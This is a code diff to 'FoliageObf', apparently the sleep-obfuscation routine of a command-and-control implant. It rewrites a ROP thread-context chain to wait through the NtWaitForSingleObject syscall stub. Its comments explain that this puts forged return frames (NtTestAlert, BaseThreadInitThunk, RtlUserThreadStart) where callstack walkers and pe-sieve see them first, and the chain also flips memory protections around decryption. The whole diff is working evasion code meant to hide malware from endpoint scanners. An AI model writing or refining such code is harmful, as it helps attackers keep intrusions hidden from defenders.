@@ -204,19 +204,28 @@ VOID FoliageObf(
                     // NtSetContextThread( Src, Spf );
 
                     // NOTE: Here is the thread sleeping...
+                    // HVC-048: Use NtWaitForSingleObject (NT stub) instead of WaitForSingleObjectEx
+                    // (kernel32 wrapper). WaitForSingleObjectEx has ~0x100-0x200 bytes of internal
+                    // call frames that bury our fake frames before the callstack walker reaches them.
+                    // The NT stub is: mov r10,rcx / mov eax,SSN / syscall / ret — zero internal CALLs.
+                    // RSP is unchanged when the kernel blocks, so NtTestAlert/BaseThreadInitThunk/
+                    // RtlUserThreadStart at [RSP+0/8/16] are the FIRST frames the walker sees.
                     RopWaitObj->ContextFlags = CONTEXT_FULL;
-                    RopWaitObj->Rip  = U_PTR( Instance->Win32.WaitForSingleObjectEx );
+                    RopWaitObj->Rip  = U_PTR( Instance->Win32.NtWaitForSingleObject );
                     RopWaitObj->Rsp -= U_PTR( 0x1000 * 7 );
                     RopWaitObj->Rcx  = U_PTR( hDupObj );
-                    RopWaitObj->Rdx  = U_PTR( Param->TimeOut );
-                    RopWaitObj->R8   = U_PTR( FALSE );
-                    /* [RSP+0] must be NtTestAlert — required for APC chain delivery after WaitForSingleObjectEx returns */
-                    /* fake frames at [RSP+8], [RSP+16] make pe-sieve see a plausible callstack depth */
+                    RopWaitObj->Rdx  = U_PTR( FALSE );  /* Alertable - same as before */
+                    /* NtWaitForSingleObject takes PLARGE_INTEGER timeout (100-ns units, negative = relative).
+                     * Store the LARGE_INTEGER at Rsp+0x28 (above the four 8-byte fake-frame slots). */
+                    *( LONGLONG* )( RopWaitObj->Rsp + 0x28 ) = -(LONGLONG)Param->TimeOut * 10000LL;
+                    RopWaitObj->R8   = U_PTR( RopWaitObj->Rsp + 0x28 );
+                    /* [RSP+0] must be NtTestAlert — required for APC chain delivery after wait returns */
+                    /* fake frames at [RSP+8], [RSP+16] are now directly visible (no WFSO internals) */
                     *( PVOID* )( RopWaitObj->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance->Win32.NtTestAlert );
                     *( PVOID* )( RopWaitObj->Rsp + ( sizeof( ULONG_PTR ) * 0x1 ) ) = C_PTR( Instance->Win32.BaseThreadInitThunk );
                     *( PVOID* )( RopWaitObj->Rsp + ( sizeof( ULONG_PTR ) * 0x2 ) ) = C_PTR( Instance->Win32.RtlUserThreadStart );
                     *( PVOID* )( RopWaitObj->Rsp + ( sizeof( ULONG_PTR ) * 0x3 ) ) = C_PTR( 0 );
-                    // WaitForSingleObjectEx( Src, Fbr->Time, FALSE );
+                    // NtWaitForSingleObject( hDupObj, FALSE, &timeout_100ns );
 
                     // PAGE_READWRITE restore: re-enable access before decryption
                     RopSetMemRw2->ContextFlags = CONTEXT_FULL;
@@ -285,7 +294,8 @@ VOID FoliageObf(
                     if ( NT_SUCCESS( SysNtAlertResumeThread( hThread, NULL ) ) )
                     {
                         RopSpoof->ContextFlags = CONTEXT_FULL;
-                        RopSpoof->Rip = U_PTR( Instance->Win32.WaitForSingleObjectEx );
+                        /* HVC-048: match RopWaitObj - main fiber appears in NT wait, not WFSO wrapper */
+                        RopSpoof->Rip = U_PTR( Instance->Win32.NtWaitForSingleObject );
                         /* write fake frames just below StackBase and point RSP there */
                         PVOID FakeFrames = C_PTR( U_PTR( Instance->Teb->NtTib.StackBase ) - 0x50 );
                         *( PVOID* )( U_PTR( FakeFrames ) + 0x00 ) = C_PTR( Instance->Win32.BaseThreadInitThunk );
